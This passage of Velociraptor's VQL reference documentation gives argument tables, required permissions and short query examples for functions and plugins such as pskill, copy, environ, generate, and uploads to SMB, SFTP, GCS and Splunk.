Arg | Description | Type
----|-------------|-----
filename|CSV files to open|OSPath (required)
accessor|The accessor to use|string
query|query to write into the file.|StoredQuery (required)

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_WRITE</span>

### Description

Write a query into a CSV file.


---END OF FILE---

======
FILE: /content/vql_reference/other/pskill/_index.md
======
---
title: pskill
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## pskill
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
pid|A pid to kill.|int64 (required)

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">EXECVE</span>

### Description

Kill the specified process.


---END OF FILE---

======
FILE: /content/vql_reference/other/upload_smb/_index.md
======
---
title: upload_smb
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## upload_smb
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
file|The file to upload|OSPath (required)
name|The name of the file that should be stored on the server|OSPath
accessor|The accessor to use|string
username|The SMB username to login as (if not provided we use the SMB_CREDENTIALS env)|string
password|The SMB password to login as (if not provided we use the SMB_CREDENTIALS env)|string
server_address|The SMB server address and optionally port followed by the share name (e.g. \\192.168.1.1:445\ShareName)|string (required)

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Upload files using the SMB file share protocol.


---END OF FILE---

======
FILE: /content/vql_reference/other/combine/_index.md
======
---
title: combine
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## combine
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>


### Description

Combine the output of several queries into the same result set.

A convenience plugin acting like chain(async=TRUE).



---END OF FILE---

======
FILE: /content/vql_reference/other/logscale_upload/_index.md
======
---
title: logscale_upload
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## logscale_upload
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
query|Source for rows to upload.|StoredQuery (required)
apibaseurl|Base URL for Ingestion API|string (required)
ingest_token|Ingest token for API|string (required)
threads|How many threads to use to post batched events.|int
http_timeout|Timeout for http requests (default: 10s)|int
max_retries|Maximum number of retries before failing an operation. A value < 0 means retry forever. (default: 7200)|int
root_ca|As a better alternative to skip_verify, allows root ca certs to be added here.|string
skip_verify|Skip verification of server certificates (default: false)|bool
batching_timeout_ms|Timeout between posts (default: 3000ms)|int
event_batch_size|Items to batch before post (default: 2000)|int
tag_fields|Name of fields to be used as tags. Fields can be renamed using =<newname>|list of string
stats_interval|Interval, in seconds, to post statistics to the log (default: 600, 0 to disable)|int
debug|Enable verbose logging.|bool

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">COLLECT_SERVER</span>

### Description

Upload rows to LogScale ingestion server.


---END OF FILE---

======
FILE: /content/vql_reference/other/sample/_index.md
======
---
title: sample
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## sample
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
query|Source query.|StoredQuery (required)
n|Pick every n row from query.|int64 (required)

### Description

Executes 'query' and samples every n'th row.

This is most useful on the server in order to downsample event
artifact results.



---END OF FILE---

======
FILE: /content/vql_reference/other/rate/_index.md
======
---
title: rate
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## rate
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
x|The X float|float64 (required)
y|The Y float|float64 (required)

### Description

Calculates the rate (derivative) between two quantities.

For example if a monitoring plugin returns an absolute value
sampled in time (e.g. bytes transferred sampled every second) then
the rate() plugin can calculate the average bytes/sec.

This function works by remembering the values of x and y from the
previous row and applying the current rows values.



---END OF FILE---

======
FILE: /content/vql_reference/other/upcase/_index.md
======
---
title: upcase
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## upcase
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
string|The string to process|string (required)

### Description

Returns an uppercase version of the string.


---END OF FILE---

======
FILE: /content/vql_reference/other/delay/_index.md
======
---
title: delay
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## delay
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
query|Source for rows.|StoredQuery (required)
delay|Number of seconds to delay.|int64 (required)
buffer_size|Maximum number of rows to buffer (default 1000).|int64

### Description

Executes 'query' and delays relaying the rows by the specified number of seconds.


---END OF FILE---

======
FILE: /content/vql_reference/other/environ/_index.md
======
---
title: environ
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## environ
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
var|Extract the var from the environment.|string (required)

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">MACHINE_STATE</span>

### Description

Get an environment variable.




<div class="vql_item"></div>


## environ
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
vars|Extract these variables from the environment and return them one per row|list of string

### Description

The row returned will have all environment variables as
columns. If the var parameter is provided, only those variables
will be provided.



---END OF FILE---

======
FILE: /content/vql_reference/other/typeof/_index.md
======
---
title: typeof
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## typeof
<span class='vql_type label label-warning pull-right page-header'>Function</span>


### Description

Print the underlying Go type of the variable.

You can use any argument name. So `typeof(x=my_var)` and
`typeof(fluffydinosaur=my_var)` are equivalent.

Only the first argument provided will be evaluated and returned.

### Examples

```vql
SELECT typeof(x=1) AS Type FROM scope()
```
returns: `Type: int64`

```vql
LET my_time <= timestamp(epoch="2024-03-26T06:53:37Z")
SELECT typeof(thing=my_time) AS Type FROM scope()
```
returns: `Type: time.Time`

### Notes

The `typeof` function is a more concise alternative to using the more
flexible and more powerful `format` function:

```vql
SELECT format(format="%T", args=x) AS Type FROM scope()
```

The `typeof` function is often used to inspect the data type of returned
values when writing and testing VQL.

It is also useful as a row filter by including it in the WHERE clause of
a query to ensure that a specific column does not contain values of an
unexpected data type.

### See also

- [format]({{< ref "/vql_reference/popular/format/" >}})



---END OF FILE---

======
FILE: /content/vql_reference/other/rm/_index.md
======
---
title: rm
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## rm
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
filename|Filename to remove.|string (required)

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_WRITE</span>

### Description

Remove a file from the filesystem using the API.


---END OF FILE---

======
FILE: /content/vql_reference/other/patch/_index.md
======
---
title: patch
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## patch
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
item|The item to patch|Any (required)
patch|A JSON patch to apply|Any
merge|A merge patch to apply|Any

### Description

Patch a JSON object with a json patch or merge.

The function allows for modifications of objects by way of
applying a json patch. You can read more about JSON patching here
https://github.com/evanphx/json-patch.

I practice you can use this to update server settings - for
example, consider the client event monitoring state.

```vql
SELECT get_client_monitoring() FROM scope()
```

```json
[
  {
    "get_client_monitoring": {
      "artifacts": [
        "Generic.Client.Stats"
      ]
    }
  }
]
```

Suppose we wish to add a new artifact, we can patch it with the json:
```json
[{"op": "add", "path": "/artifacts/0", "value": "Windows.Events.DNSQueries"}]
```

This can then be immediately pushed to `set_client_monitoring()`
to update the monitoring state.

```vql
SELECT set_client_monitoring(value=patch(
       item=get_client_monitoring(),
       patch=[dict(op="add", path="/artifacts/0", value="Windows.Events.DNSQueries")]))
FROM scope()
```



---END OF FILE---

======
FILE: /content/vql_reference/other/process_tracker_callchain/_index.md
======
---
title: process_tracker_callchain
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## process_tracker_callchain
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
id|Process ID.|string (required)

### Description

Get a call chain from the global process tracker.


---END OF FILE---

======
FILE: /content/vql_reference/other/write_jsonl/_index.md
======
---
title: write_jsonl
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## write_jsonl
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
filename|JSONL files to open|OSPath (required)
accessor|The accessor to use|string
query|query to write into the file.|StoredQuery (required)
buffer_size|Maximum size of buffer before flushing to file.|int
max_time|Maximum time before flushing the buffer (10 sec).|int
append|Append JSONL records to existing file.|bool

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_WRITE</span>

### Description

Write a query into a JSONL file.


---END OF FILE---

======
FILE: /content/vql_reference/other/dirname/_index.md
======
---
title: dirname
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## dirname
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
path|Extract directory name of path|Any (required)
sep|Separator to use (default /)|string
path_type|Type of path (e.g. windows, linux)|string

### Description

Return the directory path.

### Example

```vql
dirname(path="/usr/bin/ls") -> "/usr/bin"
```

Related: `basename()`



---END OF FILE---

======
FILE: /content/vql_reference/other/sleep/_index.md
======
---
title: sleep
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## sleep
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
time|The number of seconds to sleep|int64
ms|The number of ms to sleep|int64

### Description

Sleep for the specified number of seconds. Always returns true.


---END OF FILE---

======
FILE: /content/vql_reference/other/cidr_contains/_index.md
======
---
title: cidr_contains
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## cidr_contains
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
ip|An IP address|string (required)
ranges|A list of CIDR notation network ranges|list of string (required)

### Description

Calculates if an IP address falls within a range of CIDR specified
networks.

### Example

```vql
SELECT cidr_contains(ip="192.168.0.132",
                     ranges=["192.168.0.0/24", "127.0.0.1/8"])
FROM scope()
```
### See also

- [ip]({{< ref "/vql_reference/other/ip/" >}}): Format an IP address.
- [geoip]({{< ref "/vql_reference/other/geoip/" >}}): Lookup an IP Address
  using the MaxMind GeoIP database.



---END OF FILE---

======
FILE: /content/vql_reference/other/generate/_index.md
======
---
title: generate
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## generate
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
name|Name to call the generator|string
query|Run this query to generator rows.|StoredQuery
delay|Wait before starting the query|int64
with_file_buffer|Enable file buffering|bool
fan_out|Wait for this many listeners to connect before starting the query|int64
description|A description to add to debug server|string

### Description

Create a named generator that receives rows from the query.

This plugin allow multiple queries to efficiently filter rows from
the same query.

### Example

```vql
LET SystemLog = generate(query={
   SELECT * FROM parse_evtx(filename='''C:\Windows\system32\winevt\logs\System.evtx''')
})

SELECT timestamp(epoch=System.TimeCreated.SystemTime) AS Timestamp,
   Type, EventData
FROM combine(
a={
  SELECT *, "Kernel Driver Install" AS Type
  FROM SystemLog
  WHERE System.EventID.Value = 7045 AND EventData.ServiceType =~ "kernel"
}, b={
  SELECT *, "Log File Cleared" AS Type,
            UserData.LogFileCleared AS EventData
  FROM SystemLog
  WHERE System.EventID.Value = 104
})
```

### Notes

The `generate()` function produces a stored query that can be
used as the target of any `SELECT ... FROM` statement. Therefore
it does not make sense to materialize the output of `generate()`
because it is equivalent to materializing the actual target query
itself.

In other words this:

```vql
LET X <= generate(query={ SELECT * FROM watch_etw(...) })
```

Will attempt to enumerate the target query into an array and is
equivalent to:

```vql
LET X <= SELECT * FROM watch_etw(...)
```

Neither of those queries will terminate as VQL waits for them to
produce all their rows before moving to the next statement but the
`watch_etw()` query will never terminate since it is an event
query.



---END OF FILE---

======
FILE: /content/vql_reference/other/lazy_dict/_index.md
======
---
title: lazy_dict
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## lazy_dict
<span class='vql_type label label-warning pull-right page-header'>Function</span>


### Description

Construct a dict from arbitrary keyword args - does not materialize args so it is suitable for building args via `**` expansion.


---END OF FILE---

======
FILE: /content/vql_reference/other/strip/_index.md
======
---
title: strip
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## strip
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
string|The string to strip|string (required)
prefix|The prefix to strip|string
suffix|The suffix to strip|string

### Description

Strip prefix and/or suffix from a string

If neither prefix nor suffix are provided, leading and trailing
whitespace is stripped.

### Examples

```vql
strip(string=">>  lorem ipsum  <<", prefix=">>", suffix="<<") -> "  lorem ipsum  "
```

```vql
strip(string="   lorem ipsum   ") -> "lorem ipsum"
```



---END OF FILE---

======
FILE: /content/vql_reference/other/upload_webdav/_index.md
======
---
title: upload_webdav
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## upload_webdav
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
file|The file to upload|OSPath (required)
name|The name that the file should have on the server|string
accessor|The accessor to use|string
url|The WebDAV url|string (required)
basic_auth_user|The username to use in HTTP basic auth|string
basic_auth_password|The password to use in HTTP basic auth|string
noverifycert|Skip TLS Verification (deprecated in favor of SkipVerify)|bool
skip_verify|Skip TLS Verification|bool
user_agent|If specified, set a HTTP User-Agent.|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Upload files to a WebDAV server.


---END OF FILE---

======
FILE: /content/vql_reference/other/similarity/_index.md
======
---
title: similarity
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## similarity
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
set1|The first set to compare.|ordereddict.Dict (required)
set2|The second set to compare.|ordereddict.Dict (required)

### Description

Compare two Dicts for similarity.


---END OF FILE---

======
FILE: /content/vql_reference/other/array/_index.md
======
---
title: array
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## array
<span class='vql_type label label-warning pull-right page-header'>Function</span>


### Description

Create an array.

This function is the array constructor. It can be used to build an
array from a number of args (Note that since VQL always uses
keyword args you need to give each arg a name but this name is
actually ignored in this function):

```vql
array(a=1, b=2) -> [1, 2]
```

The function does not flatten the arguments so providing lists as
parameters will form a nested list:

```vql
array(a=[1,2]) -> [ [1, 2] ]
```

You can use the `_` argument to build the array from another
object:

```vql
array(_=[1, 2]) -> [1, 2]
```

You can use a subquery to built the object from another
query. This is called `materializing` the query because the query
will be expanded into memory (be careful about materializing a
very large query here!)

Note that materializing a query will give a list of dicts() since
each row in a query is a dict.

```vql
array(_={ SELECT User FROM Artifact.Windows.System.Users() }) -> [{"User": "Bob"}, {"User": "Fred"}]
```

To collapse to a simple list of users, simply reference the User
field:

```vql
array(_={ SELECT User FROM Artifact.Windows.System.Users() }).User -> ["Bob", "Fred"]
```

This works because the `.` operator on a list, creates another
list with the `.` operator applying on each member.



---END OF FILE---

======
FILE: /content/vql_reference/other/magic/_index.md
======
---
title: magic
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## magic
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
path|Path to open and hash.|OSPath (required)
accessor|The accessor to use|string
type|Magic type (can be empty or 'mime' or 'extension')|string
magic|Additional magic to load|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Identify a file using magic rules.

Magic rules are designed to identify a file based on a sequence of
tests. They are a great way of quickly triaging a file type based
on its content, not its name.

Detection is facilitated via libmagic - a common library powering
the unix "file" utility. Velociraptor comes with all of "file"
basic magic signatures.

You can also write your own signatures using the magic syntax (see
https://man7.org/linux/man-pages/man4/magic.4.html )

### Example

The following will check all files in /var/lib applying a custom
magic rule.

```vql
LET Magic = '''
0 search/1024 "GET Apache Logs
!:strength + 100
'''

SELECT FullPath, Size, magic(path=FullPath, magic=Magic)
FROM glob(globs="/var/lib/*")
```

### Notes

`magic()` requires reading the headers of each file which
causes the file to be opened. If you have on-access scanning such
as Windows Defender "Realtime monitoring", applying magic() on
many files (e.g. in a glob) may result in substantial load on the
endpoint.



---END OF FILE---

======
FILE: /content/vql_reference/other/batch/_index.md
======
---
title: batch
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## batch
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
batch_size|Size of batch (defaults to 10).|int64
batch_func|A VQL Lambda that determines when a batch is ready. Example 'x=>len(list=x) >= 10'.|string
query|Run this query over the item.|StoredQuery (required)
timeout|If specified we flush incomplete batches in this many seconds.|uint64

### Description

Batches query rows into multiple arrays.

This is useful for batching multiple rows from a query into
another query, such as sending results to an API endpoint.

### Example

```vql
SELECT * FROM batch(query={
  SELECT _value
  FROM range(start=0, end=10, step=1)
}, batch_size=3)
```



---END OF FILE---

======
FILE: /content/vql_reference/other/min/_index.md
======
---
title: min
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## min
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
item||LazyExpr (required)

### Description

Finds the smallest item in the aggregate.

It is only meaningful in a group by query.

### Example

The following query lists all the processes and shows the smallest
bash pid of all bash processes.

```vql
SELECT Name, min(items=Pid) as SmallestPid from pslist() Where Name =~ 'bash' group by Name
```



---END OF FILE---

======
FILE: /content/vql_reference/other/all/_index.md
======
---
title: all
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## all
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
items|The items to consider. Can be an array, subquery or stored query. Will only be lazily evaluated!|Any (required)
filter|A callback to consider each item|Lambda
regex|Optionally one or more regex can be provided for convenience|list of string

### Description

Returns TRUE if all items are true.


---END OF FILE---

======
FILE: /content/vql_reference/other/max/_index.md
======
---
title: max
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## max
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
item||LazyExpr (required)

### Description

Finds the largest item in the aggregate.

It is only meaningful in a group by query.

### Example

The following query lists all the processes and shows the largest
bash pid of all bash processes.

```vql
SELECT Name, max(items=Pid) as LargestPid from pslist() Where Name =~ 'bash' group by Name
```



---END OF FILE---

======
FILE: /content/vql_reference/other/serialize/_index.md
======
---
title: serialize
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## serialize
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
item|The item to encode|Any (required)
format|Encoding format (csv,json,yaml,hex,base64)|string

### Description

Encode an object as a string.

Several serialization formats are supported. The default format, if format
is not specified, is "json".

### Notes

This function is often useful when you need to pass a data structure to an
artifact parameter when the parameter expects a specific format. For
example,
`SELECT * FROM
Artifact.Linux.Search.FileFinder(SearchFilesGlobTable=serialize(format="csv",item=tlist),...)`
will pass a list in CSV format to the artifact's `SearchFilesGlobTable` parameter.

### See also

- [str]({{< ref "/vql_reference/popular/str/" >}}): Returns the string
  representation of the provided data.



---END OF FILE---

======
FILE: /content/vql_reference/other/upload_gcs/_index.md
======
---
title: upload_gcs
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## upload_gcs
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
file|The file to upload|OSPath (required)
name|The name of the file that should be stored on the server|string
accessor|The accessor to use|string
bucket|The bucket to upload to|string (required)
project|The project to upload to|string (required)
credentials|The credentials to use|string (required)

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Upload files to GCS.


---END OF FILE---

======
FILE: /content/vql_reference/other/read_crypto_file/_index.md
======
---
title: read_crypto_file
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## read_crypto_file
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
filename|Path to the file to write|OSPath (required)
accessor|The accessor to use|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Read a previously stored encrypted local storage file.


---END OF FILE---

======
FILE: /content/vql_reference/other/sigma_log_sources/_index.md
======
---
title: sigma_log_sources
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## sigma_log_sources
<span class='vql_type label label-warning pull-right page-header'>Function</span>


### Description

Constructs a Log sources object to be used in sigma rules. Call with args being category/product/service and values being stored queries. You may use a * as a placeholder for any of these fields.


---END OF FILE---

======
FILE: /content/vql_reference/other/enumerate/_index.md
======
---
title: enumerate
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## enumerate
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
items|The items to enumerate|Any

### Description

Collect all the items in each group by bin.

This is an aggregate function that keeps track of all elements in
a GROUP BY group.

### Notes

Use this function carefully as memory use can be large. It
keeps a copy of every element in the group and that can be very
large for large result sets.



---END OF FILE---

======
FILE: /content/vql_reference/other/copy/_index.md
======
---
title: copy
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## copy
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
filename|The file to copy from.|OSPath (required)
accessor|The accessor to use|string
dest|The destination file to write.|string (required)
permissions|Required permissions (e.g. 'x').|string
append|If true we append to the target file otherwise truncate it|bool
create_directories|If true we ensure the destination directories exist|bool

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_WRITE</span>
<span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Copy a file.

The source file can use any accessor - for example one can copy
the $MFT using the ntfs accessor to a regular file. Another
example is to extract a file from a zip file using the `zip`
accessor into a file on disk.

This function can also be used to create new files with prescribed
content, for example:

```vql
SELECT copy(filename="Hello world", accessor="data", dest="C:/hi.txt")
FROM scope()
```

NOTE: Sparse files are padded out



---END OF FILE---

======
FILE: /content/vql_reference/other/upload_azure/_index.md
======
---
title: upload_azure
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## upload_azure
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
file|The file to upload|OSPath (required)
name|The name of the file that should be stored on the server|string
accessor|The accessor to use|string
sas_url|A SAS URL to use for upload to the container.|string (required)

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Upload files to Azure Blob Storage Service.


---END OF FILE---

======
FILE: /content/vql_reference/other/ip/_index.md
======
---
title: ip
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## ip
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
parse|Parse the IP as an IPv4 or IPv6 address.|string
netaddr4_le|A network order IPv4 address (as little endian).|int64
netaddr4_be|A network order IPv4 address (as big endian).|int64

### Description

Format an IP address.

Converts an ip address encoded in various ways. If the IP address is encoded
as 32 bit integer we can use netaddr4_le or netaddr4_be to print it in a
human readable way.

This function wraps the Golang net.IP library (https://pkg.go.dev/net#IP ).
This makes it easy to deal with various IP address notations.

Returns an object of type `net.IP`, not a string. If you need to compare the
result of this function to an IP string then you should apply the `.String`
method to the result.

### Examples

1. Parse IPv4-mapped IPv6 addresses

```vql
SELECT ip(parse='0:0:0:0:0:FFFF:129.144.52.38') FROM scope()
```

Will return the string `129.144.52.38`

2. Get information about IP addresses

VQL will also expose the following attributes of the IP address:

- `IsGlobalUnicast`
- `IsInterfaceLocalMulticast`
- `IsLinkLocalMulticast`
- `IsLinkLocalUnicast`
- `IsLoopback`
- `IsMulticast`
- `IsPrivate`

```vql
SELECT ip(parse='192.168.1.2').IsPrivate FROM scope()
```

Returns "true" since this is a private address block.

### See also

- [cidr_contains]({{< ref "/vql_reference/other/cidr_contains/" >}}):
  Calculates if an IP address falls within a range of CIDR specified networks.
- [geoip]({{< ref "/vql_reference/other/geoip/" >}}): Lookup an IP Address
  using the MaxMind GeoIP database.



---END OF FILE---

======
FILE: /content/vql_reference/other/splunk_upload/_index.md
======
---
title: splunk_upload
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## splunk_upload
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
query|Source for rows to upload.|StoredQuery (required)
threads|How many threads to use.|int64
url|The Splunk Event Collector URL.|string (required)
token|Splunk HEC Token.|string
index|The name of the index to upload to. If not specified, ensure a column is named _splunk_index.|string (required)
source|The source field for splunk. If not specified ensure a column is named _splunk_source or this will be 'velociraptor'.|string
sourcetype|The sourcetype field for splunk. If not specified ensure a column is named _splunk_source_type or this will 'vql'|string
chunk_size|The number of rows to send at the time.|int64
skip_verify|Skip SSL verification(default: False).|bool
root_ca|As a better alternative to skip_verify, allows root ca certs to be added here.|string
wait_time|Batch splunk upload this long (2 sec).|int64
hostname|Hostname for Splunk Events. Defaults to server hostname.|string
timestamp_field|Field to use as event timestamp.|string
hostname_field|Field to use as event hostname. Overrides hostname parameter.|string
secret|Alternatively use a secret from the secrets service. Secret must be of type 'AWS S3 Creds'|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">COLLECT_SERVER</span>

### Description

Upload rows to splunk.


---END OF FILE---

======
FILE: /content/vql_reference/other/slice/_index.md
======
---
title: slice
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## slice
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
list|A list of items to slice|Any (required)
start|Start index (0 based)|uint64 (required)
end|End index (0 based)|uint64 (required)

### Description

Slice an array.


---END OF FILE---

======
FILE: /content/vql_reference/other/process_tracker_tree/_index.md
======
---
title: process_tracker_tree
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## process_tracker_tree
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
id|Process ID.|string
data_callback|A VQL Lambda function to that receives a ProcessEntry and returns the data node for each process.|Lambda

### Description

Get the full process tree under the process id.


---END OF FILE---

======
FILE: /content/vql_reference/other/filesystems/_index.md
======
---
title: filesystems
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## filesystems
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>


### Description

Enumerates mounted filesystems.



---END OF FILE---

======
FILE: /content/vql_reference/other/upload_sftp/_index.md
======
---
title: upload_sftp
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## upload_sftp
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
file|The file to upload|OSPath (required)
name|The name of the file that should be stored on the server (may contain the path)|string
user|The username to connect to the endpoint with|string (required)
path|Path on server to upload file to (will be prepended to name)|string
accessor|The accessor to use|string
privatekey|The private key to use|string (required)
endpoint|The Endpoint to use including port number (e.g. 192.168.1.1:22 )|string (required)
hostkey|Host key to verify. Blank to disable|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Upload files to SFTP.


---END OF FILE---

======
FILE: /content/vql_reference/other/process_tracker_children/_index.md
======
---
title: process_tracker_children
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## process_tracker_children
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
id|Process ID.|string (required)

### Description

Get all children of a process.


---END OF FILE---

======
FILE: /content/vql_reference/other/atexit/_index.md
======
---
title: atexit
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## atexit
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
query|A VQL Query to parse and execute.|Any (required)
env|A dict of args to insert into the scope.|ordereddict.Dict
timeout|How long to wait for destructors to run (default 60 seconds).|uint64

### Description

Install a query to run when the query is unwound. This is used to
clean up when the query ends.

### Example

```vql
LET _ <= atexit(query={
  SELECT rm(filename="Foobar.txt") FROM scope()
})
```



---END OF FILE---

======
FILE: /content/vql_reference/other/host/_index.md
======
---
title: host
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## host
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
